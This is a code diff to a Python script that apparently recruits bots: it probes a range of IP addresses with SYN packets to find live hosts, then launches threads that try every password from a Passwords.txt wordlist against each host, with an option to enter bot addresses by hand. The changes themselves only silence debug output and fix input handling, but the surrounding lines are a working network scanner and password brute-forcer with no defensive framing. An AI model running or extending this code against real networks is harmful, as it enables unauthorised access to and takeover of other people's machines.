@@ -49,7 +49,7 @@ def generaterangeofipstoconnect(rangestr):
 	for index in range(255):
 		listofips.append(rangestr + '.' + str(index))
 
-	print(listofips)
+	#print(listofips)
 
 	return listofips
 
@@ -61,7 +61,6 @@ def findtargets():
 	global mutex
 	for index in range(107,115):
 		ipaddress = IP_RANGE + '.' + str(index)
-		print('Current IP check = ', ipaddress)
 		if ipaddress != TARGET:
 			answer = sr1(IP(dst=ipaddress)/TCP(dport=80,flags="S"),timeout=2)
 			if answer != None:
@@ -95,9 +94,9 @@ if int(input_choice) == 1:
 if int(input_choice) == 2:
 	getnumberofbots = raw_input("How many bots would you like to connect to: ")
 
-	for index in range(getnumberofbots):
-		botip = raw_input("Enter the ip address of bot {}".format(index + 1))
-		listofopenipaddresses.append(botip)
+	for index in range(int(getnumberofbots)):
+		botip = raw_input("Enter the ip address of bot {}: ".format(index + 1))
+		listofopenipaddresses.append(str(botip))
 
 if int(input_choice) == 1:
 	while searchdone == False:
@@ -106,6 +105,7 @@ if int(input_choice) == 1:
 			with open("Passwords.txt",'r') as file:
 				content = file.readlines()
 				listofpasswords = [parsefile.strip() for parsefile in content]
+				#print(listofpasswords)
 				for row in listofpasswords:
 					t = threading.Thread(target=tryandconnect, args = (listofopenipaddresses[index],row,successclients))
 					threadpool.append(t)
@@ -123,6 +123,7 @@ else:
 		with open("Passwords.txt",'r') as file:
 			content = file.readlines()
 			listofpasswords = [parsefile.strip() for parsefile in content]
+
 			for row in listofpasswords:
 				t = threading.Thread(target=tryandconnect, args = (listofopenipaddresses[index],row,successclients))
 				threadpool.append(t)
